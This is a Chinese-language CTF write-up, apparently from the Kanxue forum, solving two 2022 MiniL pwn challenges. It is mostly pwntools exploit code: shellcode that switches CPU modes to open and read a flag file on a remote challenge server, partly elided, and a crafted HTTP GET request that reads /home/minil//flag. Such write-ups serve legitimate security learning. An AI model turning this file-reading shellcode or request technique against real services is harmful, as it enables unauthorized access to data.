
```python
from pwn import *
from hashlib import sha256
import base64
context.log_level = 'debug'
#context.arch = 'amd64'
context.os = 'linux'
def proof_of_work(sh):
    sh.recvuntil(" == ")
    cipher = sh.recvline().strip().decode("utf8")
    proof = mbruteforce(lambda x: sha256((x).encode()).hexdigest() == cipher, string.ascii_letters + string.digits, length=4, method='fixed')
    sh.sendlineafter("input your ????>", proof)
##r=process('./shellcode')
r = remote('pwn.archive.xdsec.chall.frankli.site',10070)
##mmap(0x40404040,0x7e,7,34,0,0)
def asm64(shell):
    return asm(shell,arch = 'amd64',os = 'linux')
def asm32(shell):
    return asm(shell,arch = 'i386',os = 'linux')
sys_mmap = '''
push 0x40404040;
mov r9,rax;
...
'''
sys_read = '''
push 0x400;
pop rdx;
...
'''
content = '''
push 0x23;
push 0x40403040;
...
'''
sys_open = '''
mov esp,0x40404020;
...
'''
to_32 = '''
jmp rsi;
'''
syss_read = '''
mov rsp,0x40404070;
...
'''
sys_write = '''
mov rdi,1;
mov rax,rdi;
syscall;
'''
shellcode = '\x00' + asm64(sys_mmap) + asm64(sys_read) + asm64(to_32)
shellcode = shellcode.ljust(0x50,'\x00')
print('test:'+str(len(asm64('nop'))))
content = asm64(content)
content = content.ljust(0x20,'\x00') + './flag.txt'.ljust(16,'\x00')
content = content.ljust(0x40,'\x00') + asm64(sys_open)
content = content.ljust(0x5a,'\x00') + asm64(syss_read) + asm64(sys_write)
content = content.ljust(0xa0,'\x00') + p32(0x40404069) + p32(0x33)
r.send(shellcode)
sleep(3)
r.send(content)
r.interactive()
```

# Easyhttpd

考查远程监听问题，主要是如何通过连接疏通 `accept` 函数的阻塞

## 保护

![img](https://bbs.kanxue.com/upload/attach/202205/943085_VDYGYF8JJXW6K52.jpg)

## ida

![img](https://bbs.kanxue.com/upload/attach/202205/943085_9HH8J4QYAAJ9H4J.jpg)

主要是这个 `accept` 函数，会一直被动地等待端口连接，需要在脚本里加入

```python
r = remote('0.0.0.0', 2048) ##本地
r = remote('dockerip', docker端口) ##远程
```

就可以实现用 `send` 和 `recv` 进行的这个进程和连接的交互

其它的就是一些很简单的绕过了

比如

![img](https://bbs.kanxue.com/upload/attach/202205/943085_66DD4M7AASZV93N.jpg)

可以直接令 `S1` = `/home/minil//flag`

## exp

```python
import os
from pwn import *
from hashlib import sha256
import base64
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
def proof_of_work(sh):
    sh.recvuntil(" == ")
    cipher = sh.recvline().strip().decode("utf8")
    proof = mbruteforce(lambda x: sha256((x).encode()).hexdigest() == cipher, string.ascii_letters + string.digits, length=4, method='fixed')
    sh.sendlineafter("input your ????>", proof)

r = process('./easy')
##r = remote("pwn.archive.xdsec.chall.frankli.site", 10008)

def z():
    gdb.attach(r)

##z()
##gdb.attach(r)
s = remote('pwn.archive.xdsec.chall.frankli.site',10008)
##s=remote('0.0.0.0',10008)
##pd="GET "+'./flag'+'\r\n'+"User-Agent: "+'MiniL'+'\r\n\r\n'
pd = "GET " + '/home/minil//flag' + '\r\n' + "User-Agent: " + 'MiniL' + '\r\n\r\n'
pd = pd.ljust(255,'\x00')
s.send(pd)
s.interactive()
##r.sendlineafter("Welcome to 2022 MiniL\n",string)
os.system('netstat -aptn')

r.interactive()
```

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2022-6-4 14:13

被Nameless_a编辑，原因：
